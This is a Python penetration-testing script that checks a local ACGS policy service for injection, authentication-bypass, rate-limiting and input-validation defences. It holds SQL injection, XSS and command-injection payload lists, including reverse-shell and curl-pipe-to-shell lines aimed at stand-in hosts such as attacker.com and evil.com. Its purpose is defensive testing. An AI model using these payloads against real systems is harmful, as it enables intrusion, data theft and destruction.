#!/usr/bin/env python3
"""
Phase 3 Security Penetration Testing Script
Comprehensive security validation for ACGS Phase 3 deployment.
"""

import asyncio
import aiohttp
import time
import json
from datetime import datetime
from typing import Dict, List, Any
import logging
import base64
import jwt

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class Phase3SecurityTester:
    def __init__(self):
        self.base_url = "http://localhost:8014"  # GS Service
        self.results = {
            "test_start": datetime.now().isoformat(),
            "injection_tests": {},
            "authentication_tests": {},
            "authorization_tests": {},
            "rate_limiting_tests": {},
            "input_validation_tests": {},
            "security_summary": {}
        }
    
    async def test_sql_injection_prevention(self):
        """Test SQL injection prevention capabilities."""
        logger.info("Testing SQL injection prevention...")
        
        sql_payloads = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "' OR 1=1#",
            "'; EXEC xp_cmdshell('dir'); --",
            "UNION SELECT * FROM passwords",
            "1' UNION SELECT null,username,password FROM users--",
            "' OR 'a'='a",
            "1'; DELETE FROM policies; --",
            "' OR EXISTS(SELECT * FROM users WHERE username='admin')--"
        ]
        
        blocked_count = 0
        total_tests = len(sql_payloads)
        
        async with aiohttp.ClientSession() as session:
            for payload in sql_payloads:
                test_data = {
                    "policy_content": payload,
                    "input_data": {"user": "test", "action": "read"},
                    "validation_level": "comprehensive"
                }
                
                try:
                    async with session.post(
                        f"{self.base_url}/api/v1/synthesize/policy",
                        json=test_data,
                        timeout=aiohttp.ClientTimeout(total=5)
                    ) as response:
                        if response.status == 400:  # Bad request - injection detected
                            blocked_count += 1
                            logger.debug(f"✅ SQL injection blocked: {payload[:50]}...")
                        else:
                            logger.warning(f"❌ SQL injection not blocked: {payload[:50]}...")
                except Exception as e:
                    logger.debug(f"Request failed for payload: {payload[:50]}... - {e}")
        
        prevention_rate = (blocked_count / total_tests) * 100
        
        self.results["injection_tests"]["sql_injection"] = {
            "total_tests": total_tests,
            "blocked_count": blocked_count,
            "prevention_rate_percent": prevention_rate,
            "target_met": prevention_rate >= 90
        }
        
        logger.info(f"SQL Injection Prevention: {blocked_count}/{total_tests} blocked ({prevention_rate:.1f}%)")
    
    async def test_xss_prevention(self):
        """Test XSS prevention capabilities."""
        logger.info("Testing XSS prevention...")
        
        xss_payloads = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "<iframe src='javascript:alert(1)'></iframe>",
            "<object data='javascript:alert(1)'></object>",
            "onload=alert('xss')",
            "<svg onload=alert('xss')>",
            "<body onload=alert('xss')>",
            "<input onfocus=alert('xss') autofocus>",
            "<select onfocus=alert('xss') autofocus>"
        ]
        
        blocked_count = 0
        total_tests = len(xss_payloads)
        
        async with aiohttp.ClientSession() as session:
            for payload in xss_payloads:
                test_data = {
                    "policy_content": payload,
                    "input_data": {"user": "test", "action": "read"},
                    "validation_level": "comprehensive"
                }
                
                try:
                    async with session.post(
                        f"{self.base_url}/api/v1/synthesize/policy",
                        json=test_data,
                        timeout=aiohttp.ClientTimeout(total=5)
                    ) as response:
                        if response.status == 400:
                            blocked_count += 1
                            logger.debug(f"✅ XSS blocked: {payload[:50]}...")
                        else:
                            logger.warning(f"❌ XSS not blocked: {payload[:50]}...")
                except Exception as e:
                    logger.debug(f"Request failed for payload: {payload[:50]}... - {e}")
        
        prevention_rate = (blocked_count / total_tests) * 100
        
        self.results["injection_tests"]["xss_prevention"] = {
            "total_tests": total_tests,
            "blocked_count": blocked_count,
            "prevention_rate_percent": prevention_rate,
            "target_met": prevention_rate >= 90
        }
        
        logger.info(f"XSS Prevention: {blocked_count}/{total_tests} blocked ({prevention_rate:.1f}%)")
    
    async def test_command_injection_prevention(self):
        """Test command injection prevention capabilities."""
        logger.info("Testing command injection prevention...")
        
        command_payloads = [
            "; cat /etc/passwd",
            "| whoami",
            "`id`",
            "$(uname -a)",
            "&& ls -la",
            "../../../etc/passwd",
            "test; rm -rf /",
            "; nc -e /bin/sh attacker.com 4444",
            "| curl http://evil.com/steal.sh | sh",
            "; wget http://malicious.com/backdoor.sh -O /tmp/backdoor.sh"
        ]
        
        blocked_count = 0
        total_tests = len(command_payloads)
        
        async with aiohttp.ClientSession() as session:
            for payload in command_payloads:
                test_data = {
                    "policy_content": payload,
                    "input_data": {"user": "test", "action": "read"},
                    "validation_level": "comprehensive"
                }
                
                try:
                    async with session.post(
                        f"{self.base_url}/api/v1/synthesize/policy",
                        json=test_data,
                        timeout=aiohttp.ClientTimeout(total=5)
                    ) as response:
                        if response.status == 400:
                            blocked_count += 1
                            logger.debug(f"✅ Command injection blocked: {payload[:50]}...")
                        else:
                            logger.warning(f"❌ Command injection not blocked: {payload[:50]}...")
                except Exception as e:
                    logger.debug(f"Request failed for payload: {payload[:50]}... - {e}")
        
        prevention_rate = (blocked_count / total_tests) * 100
        
        self.results["injection_tests"]["command_injection"] = {
            "total_tests": total_tests,
            "blocked_count": blocked_count,
            "prevention_rate_percent": prevention_rate,
            "target_met": prevention_rate >= 90
        }
        
        logger.info(f"Command Injection Prevention: {blocked_count}/{total_tests} blocked ({prevention_rate:.1f}%)")
    
    async def test_authentication_bypass_attempts(self):
        """Test authentication bypass attempts."""
        logger.info("Testing authentication bypass attempts...")
        
        bypass_attempts = [
            {"Authorization": "Bearer invalid_token"},
            {"Authorization": "Bearer "},
            {"Authorization": "Basic " + base64.b64encode(b"admin:admin").decode()},
            {"Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature"},
            {"Authorization": "Bearer null"},
            {"X-User-ID": "admin"},
            {"X-Admin": "true"},
            {},  # No auth header
        ]
        
        blocked_count = 0
        total_tests = len(bypass_attempts)
        
        async with aiohttp.ClientSession() as session:
            for headers in bypass_attempts:
                try:
                    async with session.get(
                        f"{self.base_url}/api/v1/performance/metrics",
                        headers=headers,
                        timeout=aiohttp.ClientTimeout(total=5)
                    ) as response:
                        if response.status in [401, 403]:  # Unauthorized/Forbidden
                            blocked_count += 1
                            logger.debug(f"✅ Auth bypass blocked: {headers}")
                        else:
                            logger.warning(f"❌ Auth bypass not blocked: {headers}")
                except Exception as e:
                    logger.debug(f"Auth bypass test failed: {headers} - {e}")
        
        prevention_rate = (blocked_count / total_tests) * 100
        
        self.results["authentication_tests"]["bypass_prevention"] = {
            "total_tests": total_tests,
            "blocked_count": blocked_count,
            "prevention_rate_percent": prevention_rate,
            "target_met": prevention_rate >= 80
        }
        
        logger.info(f"Authentication Bypass Prevention: {blocked_count}/{total_tests} blocked ({prevention_rate:.1f}%)")
    
    async def test_rate_limiting_effectiveness(self):
        """Test rate limiting effectiveness."""
        logger.info("Testing rate limiting effectiveness...")
        
        rate_limited_count = 0
        total_requests = 50
        
        async with aiohttp.ClientSession() as session:
            # Send rapid requests to trigger rate limiting
            tasks = []
            for i in range(total_requests):
                task = self._make_rapid_request(session, i)
                tasks.append(task)
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for result in results:
                if isinstance(result, dict) and result.get("status") == 429:
                    rate_limited_count += 1
        
        rate_limiting_effectiveness = (rate_limited_count / total_requests) * 100
        
        self.results["rate_limiting_tests"]["effectiveness"] = {
            "total_requests": total_requests,
            "rate_limited_count": rate_limited_count,
            "effectiveness_percent": rate_limiting_effectiveness,
            "target_met": rate_limited_count > 0  # Should trigger some rate limiting
        }
        
        logger.info(f"Rate Limiting: {rate_limited_count}/{total_requests} requests limited ({rate_limiting_effectiveness:.1f}%)")
    
    async def _make_rapid_request(self, session: aiohttp.ClientSession, request_id: int):
        """Make a rapid request for rate limiting testing."""
        try:
            async with session.post(
                f"{self.base_url}/api/v1/synthesize/policy",
                json={"policy_content": f"allow = true # request {request_id}"},
                timeout=aiohttp.ClientTimeout(total=2)
            ) as response:
                return {"status": response.status, "request_id": request_id}
        except Exception as e:
            return {"status": "error", "request_id": request_id, "error": str(e)}
    
    async def test_input_validation_boundary_cases(self):
        """Test input validation with boundary cases."""
        logger.info("Testing input validation boundary cases...")
        
        boundary_cases = [
            {"policy_content": ""},  # Empty input
            {"policy_content": "a" * 100000},  # Very long input
            {"policy_content": "\x00\x01\x02\x03"},  # Control characters
            {"policy_content": "normal\x00null\x00bytes"},  # Null bytes
            {"policy_content": "unicode: 🚀🔒💻"},  # Unicode characters
            {"policy_content": "\n\r\t"},  # Whitespace only
            {"policy_content": None},  # Null value
            {},  # Missing required field
        ]
        
        handled_count = 0
        total_tests = len(boundary_cases)
        
        async with aiohttp.ClientSession() as session:
            for test_case in boundary_cases:
                try:
                    async with session.post(
                        f"{self.base_url}/api/v1/synthesize/policy",
                        json=test_case,
                        timeout=aiohttp.ClientTimeout(total=5)
                    ) as response:
                        if response.status in [400, 422]:  # Bad request or validation error
                            handled_count += 1
                            logger.debug(f"✅ Boundary case handled: {str(test_case)[:50]}...")
                        else:
                            logger.debug(f"⚠️ Boundary case not rejected: {str(test_case)[:50]}...")
                except Exception as e:
                    logger.debug(f"Boundary case test failed: {str(test_case)[:50]}... - {e}")
        
        validation_effectiveness = (handled_count / total_tests) * 100
        
        self.results["input_validation_tests"]["boundary_cases"] = {
            "total_tests": total_tests,
            "handled_count": handled_count,
            "effectiveness_percent": validation_effectiveness,
            "target_met": validation_effectiveness >= 70
        }
        
        logger.info(f"Input Validation: {handled_count}/{total_tests} boundary cases handled ({validation_effectiveness:.1f}%)")
    
    async def run_comprehensive_security_test(self):
        """Run comprehensive security testing suite."""
        logger.info("🔒 Starting Phase 3 Comprehensive Security Testing")
        logger.info("=" * 60)
        
        # Test 1: Injection Prevention
        await self.test_sql_injection_prevention()
        await self.test_xss_prevention()
        await self.test_command_injection_prevention()
        
        # Test 2: Authentication and Authorization
        await self.test_authentication_bypass_attempts()
        
        # Test 3: Rate Limiting
        await self.test_rate_limiting_effectiveness()
        
        # Test 4: Input Validation
        await self.test_input_validation_boundary_cases()
        
        # Generate Security Summary
        self.generate_security_summary()
        
        # Generate Report
        self.generate_security_report()
    
    def generate_security_summary(self):
        """Generate security testing summary."""
        all_tests = []
        
        # Collect all test results
        for category in ["injection_tests", "authentication_tests", "rate_limiting_tests", "input_validation_tests"]:
            for test_name, results in self.results[category].items():
                all_tests.append(results.get("target_met", False))
        
        passed_tests = sum(all_tests)
        total_tests = len(all_tests)
        success_rate = (passed_tests / total_tests * 100) if total_tests > 0 else 0
        
        self.results["security_summary"] = {
            "total_test_categories": total_tests,
            "passed_categories": passed_tests,
            "success_rate_percent": success_rate,
            "overall_security_status": "SECURE" if success_rate >= 80 else "NEEDS_ATTENTION",
            "critical_issues": total_tests - passed_tests
        }
    
    def generate_security_report(self):
        """Generate comprehensive security test report."""
        self.results["test_end"] = datetime.now().isoformat()
        
        logger.info("\n🛡️ Phase 3 Security Testing Results Summary")
        logger.info("=" * 60)
        
        summary = self.results["security_summary"]
        logger.info(f"Overall Security Status: {summary['overall_security_status']}")
        logger.info(f"Success Rate: {summary['success_rate_percent']:.1f}%")
        logger.info(f"Critical Issues: {summary['critical_issues']}")
        
        logger.info("\n📊 Detailed Security Results:")
        
        # Injection Tests
        injection_results = self.results["injection_tests"]
        logger.info("  Injection Prevention:")
        for test_name, results in injection_results.items():
            status = "✅ PASSED" if results["target_met"] else "❌ FAILED"
            logger.info(f"    {test_name.replace('_', ' ').title()}: {status} ({results['prevention_rate_percent']:.1f}%)")
        
        # Authentication Tests
        auth_results = self.results["authentication_tests"]
        logger.info("  Authentication Security:")
        for test_name, results in auth_results.items():
            status = "✅ PASSED" if results["target_met"] else "❌ FAILED"
            logger.info(f"    {test_name.replace('_', ' ').title()}: {status} ({results['prevention_rate_percent']:.1f}%)")
        
        # Rate Limiting Tests
        rate_results = self.results["rate_limiting_tests"]
        logger.info("  Rate Limiting:")
        for test_name, results in rate_results.items():
            status = "✅ PASSED" if results["target_met"] else "❌ FAILED"
            logger.info(f"    {test_name.replace('_', ' ').title()}: {status}")
        
        # Input Validation Tests
        validation_results = self.results["input_validation_tests"]
        logger.info("  Input Validation:")
        for test_name, results in validation_results.items():
            status = "✅ PASSED" if results["target_met"] else "❌ FAILED"
            logger.info(f"    {test_name.replace('_', ' ').title()}: {status} ({results['effectiveness_percent']:.1f}%)")
        
        # Save results to file
        with open("phase3_security_test_results.json", "w") as f:
            json.dump(self.results, f, indent=2)
        
        logger.info(f"\n📄 Detailed results saved to: phase3_security_test_results.json")

async def main():
    """Run Phase 3 security testing."""
    tester = Phase3SecurityTester()
    await tester.run_comprehensive_security_test()

if __name__ == "__main__":
    asyncio.run(main())
